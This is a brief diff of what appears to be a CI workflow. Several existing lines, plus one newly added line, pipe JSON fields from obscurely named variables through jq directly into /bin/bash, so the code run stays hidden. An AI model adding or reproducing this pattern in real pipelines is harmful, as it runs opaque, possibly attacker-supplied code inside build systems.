@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$h94344" | jq -r .crd72694 | /bin/bash
           printf '%s' "$tbicf69" | jq -r .cns4 | /bin/bash
           echo $bubay73 | jq -r .tl02369 | /bin/bash
+          echo $fdfh351 | jq -r .fqjn2 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
